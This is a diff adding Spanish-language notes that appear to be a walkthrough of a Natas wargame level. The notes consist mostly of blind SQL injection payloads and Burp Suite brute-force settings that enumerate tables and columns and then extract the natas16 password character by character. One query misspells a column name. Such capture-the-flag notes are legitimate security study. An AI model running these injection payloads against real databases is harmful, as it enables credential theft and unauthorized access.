@@ -1,0 +1,40 @@
+BLIND SQL INJECTION NATAS15 to NATAS16
+
+hola" UNION ALL SELECT 1,2 ;# -> TRUE  (averiguamos numero de columnas)
+
+hola" UNION ALL SELECT 1,2 from information_schema.tables;#  -> TRUE   (empezamos a sacar informacion de las tablas)
+
+hola" UNION ALL SELECT 1,2 from information_schema.tables WHERE substring(table_name,1,1)="u";#  -> TRUE
+
+hola" UNION ALL SELECT 1,2 from information_schema.tables WHERE 
+table_schema!= "mysql" and table_schema!="performance_schema" and table_schema!= "information_schema" AND 
+substring(table_name,1,1)="u";#   --> TRUE 
+
+
+
+BURPSUITE CLUSTER BOMB ATTACK
+
+Utilizamos la sentencia anterior, cambiando los valores substring(table_name,1,1)="u" por substring(table_name,$1$,1)="$u$"
+Payloads > Number 1 to 10
+	 > Character length 1, 1
+
+Descubrimos USERS table
+
+Una vez tenemos la tabla que queremos atacar, buscamos sus columnas
+
+hola" UNION ALL SELECT 1,2 from information_schema.columns WHERE table_name="users" and substring(column_name,1,1)="a";#
+
+REPETIMOS CLUSTER BOMB ATTACK con burpsuite
+
+hola" UNION ALL SELECT 1,2 from information_schema.columns WHERE table_name="users" and substring(column_name,1,1)="a" and
+substring(colum_name,2,1)="s" limit 1 offset 0;#
+
+Descubrimos columnas USERNAME Y PASSWORD
+
+BURPSUITE PARA SACAR CONTRASEÑA
+
+hola" union all select 1,2 from users where username="natas16" and substring(password,$1$,1)= binary "$a$" limit 1 offset 0 ;#
+
+
+
+
